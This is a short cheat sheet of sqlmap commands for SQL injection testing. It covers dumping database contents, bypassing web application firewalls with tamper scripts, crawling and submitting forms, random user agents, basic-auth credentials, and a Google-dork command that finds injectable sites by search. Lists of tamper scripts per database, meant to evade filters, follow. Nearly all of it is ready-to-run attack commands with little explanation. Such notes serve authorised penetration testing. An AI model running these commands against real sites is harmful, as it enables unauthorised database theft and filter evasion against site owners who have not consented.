# SQLMAP COMMANDS 
### Dumping payloads
    $ sqlmap -r file.txt -p username --dump

### Bypassing WAF
    $ sqlmap -u 'https://target.com/index.php?name=abc’ --tamper=apostrophemask,apostrophenullencode

### Crawling with exclude and include switch
    $ sqlmap -u "https://target.com/index.php" --crawl=5 --crawl-exclude="logout" --forms

### Use default option instead of waiting for user input
    $ sqlmap -u "https://target.com/index.php?name=abc" --batch

### Cookies and Data 
    $ sqlmap –u "https://target.com/index.php" --cookies= --data=

### Using Random-Agent
    $ sqlmap.py -u "http://mytestsite.com/page.php?id=5" --random-agent

### sqlmapapi server
    $ sqlmapapi.py -s -H <IP> -p <Port>

### Basic Authentication
    $ sqlmap -u “https://target_site.com/page/” --data="p1=value1&p2=value2" --auth-type=basic --auth-cred=username:password

### Google Dorks with sqlmap
    $ sqlmap.py -g “inurl:\”php?id=\”” –random-agent -f –batch –answer=”extending=N,follow=N,keep=N,exploit=n”

## Tamper for different databases 
***** General use: \tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes

***** MSSQL: tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes

*****MySQL: tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor

### Refrences
   - https://edricteo.com/sqlmap-commands/
   - https://sqlmap.org/
